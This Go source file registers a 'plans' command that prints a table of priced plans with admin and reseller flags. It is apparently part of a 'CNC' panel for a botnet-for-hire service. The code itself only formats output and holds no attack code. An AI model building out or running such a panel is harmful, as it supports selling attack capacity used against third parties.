package Commands

import (
	ParseJson "Rain/core/functions/json"
	Util "Rain/core/functions/util"
	Sessions "Rain/core/masters/sessions"
	ParseINI "Rain/core/functions/ini"

	"fmt"
	"strings"

	"github.com/alexeyco/simpletable"
)

func init() {
	Load_Commands(&Command_interface{
		Name:        "plans",
		Roles:       []string{"everyone"},
		Admin:       false,
		Reseller:    false,
		Description: "Displays CNC plans",
		CommandExecution: func(session *Sessions.Session, cmd []string) error {

			session.Channel.Write([]byte("\x1b[0m"))
			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "Name"},
					{Align: simpletable.AlignCenter, Text: "Description"},
					{Align: simpletable.AlignCenter, Text: "Price"},
					{Align: simpletable.AlignCenter, Text: "Admin"},
					{Align: simpletable.AlignCenter, Text: "Reseller"},
				},
			}

			for _, C := range ParseJson.PlansParse.Plan {
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: C.Name},
					{Align: simpletable.AlignCenter, Text: C.Description},
					{Align: simpletable.AlignCenter, Text: C.Price},
					{Align: simpletable.AlignCenter, Text: Util.ColourizeBoolen(C.Admin, true)},
					{Align: simpletable.AlignCenter, Text: Util.ColourizeBoolen(C.Reseller, true)},
				}

				table.Body.Cells = append(table.Body.Cells, r)
			}

			ParseINI.ParseTablePlans(table)


			fmt.Fprint(session.Channel, "")
			fmt.Fprintln(session.Channel, strings.ReplaceAll(table.String(), "\n", "\r\n"))
			fmt.Fprint(session.Channel, "\r")

			return nil
		},
	})
}